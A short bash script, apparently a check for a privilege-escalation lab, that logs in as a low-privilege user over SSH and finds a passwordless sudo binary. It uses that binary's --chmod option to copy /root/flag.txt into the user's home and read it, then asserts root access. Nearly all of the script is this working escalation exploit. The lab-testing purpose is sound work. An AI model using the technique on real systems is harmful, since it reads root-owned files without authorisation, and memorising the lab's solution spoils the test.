#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}"); rm -f /home/lowpriv/rsflag; sudo -n "$BIN" --chmod=644 /root/flag.txt /home/lowpriv/rsflag; cat /home/lowpriv/rsflag')"
assert_root_output "${out}"
